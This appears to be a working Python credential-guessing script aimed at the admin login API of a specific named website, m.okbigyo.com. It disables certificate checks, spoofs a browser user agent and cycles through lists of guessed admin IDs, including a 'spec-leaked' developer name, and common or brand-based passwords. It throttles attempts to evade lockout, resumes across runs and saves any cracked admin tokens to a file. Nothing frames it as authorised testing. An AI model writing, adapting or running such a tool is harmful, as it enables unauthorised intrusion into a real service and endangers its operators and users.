#!/usr/bin/env python3
"""Admin credential attack for /bigyo/admin-api/auth/login.

State in admin_state.json: per-id attempts + last password index, so
cycles resume without re-burning ids. Max MAX_PER_ID attempts per id
(admin side likely locks after N — keep it conservative).
Success: writes admin_token.json {adminId, token, name, ts}.
"""
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/login"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

MAX_PER_ID = 12
DELAY = 1.5

IDS = [
    # spec-leaked dev name
    "dongmin", "kimdongmin", "kdongmin",
    # generic
    "admin", "administrator", "manager", "master", "root", "superadmin",
    "god", "operator", "oper", "staff", "test", "demo", "guest", "cs",
    "support", "care", "center", "biz", "sales", "finance", "loan",
    # brand
    "okbigyo", "bigyo", "okbank", "ok", "coocon", "okcs", "okadmin",
    "bigyoadmin", "cooconadmin", "okbigyo1", "bigyo1", "okbigyo123",
    # korean dev names (romanized)
    "seoyeon", "hyemin", "minji", "sujin", "jiwoo", "taeyang", "haneul",
    "sungmin", "jihyun", "minseo", "yejin", "eunjoo", "jiyoon", "haerin",
    "dasom", "siwon", "junho", "yujin", "gihun", "woohyuk", "jaehyuk",
    "seungjun", "hyunsik", "kyungmin", "namchu", "byeongsu", "changho",
    # english common
    "kevin", "david", "chris", "mike", "james", "peter", "alex", "ben",
    "tom", "lucy", "emma", "mia", "grace", "angel", "star", "moon",
    "coffee", "happy", "love", "hello", "welcome", "money", "bank",
]

PASSWORDS = [
    "admin1234", "admin123!", "admin1234!", "Admin1234!", "admin!1234",
    "okbigyo1234", "Okbigyo1234!", "okbigyo!", "okbigyo123",
    "bigyo1234", "Bigyo1234!", "bigyo!", "bigyo123",
    "coocon1234", "Coocon1234!", "coocon!", "coocon123",
    "ok1234!", "ok1234", "okbank1234", "okbank!",
    "1qaw2ews", "1q2w3e4r", "qwerty1234", "qwer1234", "zaq1xsw2",
    "password", "password1", "pass1234", "abc12345", "abcd1234",
    "iloveyou1!", "hello1234", "welcome1!", "test1234", "spring1234",
    "oracle1234", "weblogic1234", "11111111", "00000000", "12345678",
    "123456789", "1234567890", "123456789!", "1234567890!",
    "a12345678", "a123456789", "q12345678", "pw123456", "temp1234",
    "20240101", "20250101", "20260101", "okbigyo2026", "bigyo2026",
]


def state_load():
    p = os.path.join(HERE, "admin_state.json")
    if os.path.exists(p):
        return json.load(open(p))
    return {}


def state_save(st):
    json.dump(st, open(os.path.join(HERE, "admin_state.json"), "w"))


def try_login(aid, pwd):
    body = json.dumps({"adminId": aid, "password": pwd}).encode()
    req = urllib.request.Request(URL, data=body,
                                 headers={"User-Agent": UA,
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"http": e.code}
    except Exception as e:
        return {"net_err": str(e)[:120]}


def main():
    if os.path.exists(os.path.join(HERE, "admin_token.json")):
        print("admin_token.json exists — skipping")
        return
    st = state_load()
    creds = []
    for aid in IDS:
        rec = st.get(aid, {"pwd_idx": 0})
        if rec.get("done"):
            continue
        idx = rec["pwd_idx"]
        while idx < len(PASSWORDS) and (rec.get("attempts", 0) < MAX_PER_ID):
            pwd = PASSWORDS[idx]
            resp = try_login(aid, pwd)
            idx += 1
            rec["pwd_idx"] = idx
            rec["attempts"] = rec.get("attempts", 0) + 1
            st[aid] = rec
            data = resp.get("data") if isinstance(resp, dict) else None
            if isinstance(data, dict) and (data.get("token") or data.get("accessToken")):
                print(f"*** ADMIN CRACKED: {aid} / {pwd}", flush=True)
                creds.append({"adminId": aid, "password": pwd, "data": data,
                              "ts": int(time.time())})
                rec["done"] = True
                state_save(st)
                break
            msg = resp.get("message") or resp.get("msg") or resp.get("error") or ""
            print(f"{aid} / {pwd:<18} -> {str(resp)[:150]}", flush=True)
            if rec["attempts"] >= MAX_PER_ID:
                rec["done"] = True
                print(f"-- {aid} budget exhausted, moving on", flush=True)
            time.sleep(DELAY)
        state_save(st)
    if creds:
        json.dump(creds, open(os.path.join(HERE, "admin_token.json"), "w"),
                  ensure_ascii=False, indent=1)
        print("WROTE admin_token.json", flush=True)
    print(f"CYCLE DONE. ids={len(IDS)} attempted-so-far={len(st)}", flush=True)


if __name__ == "__main__":
    main()
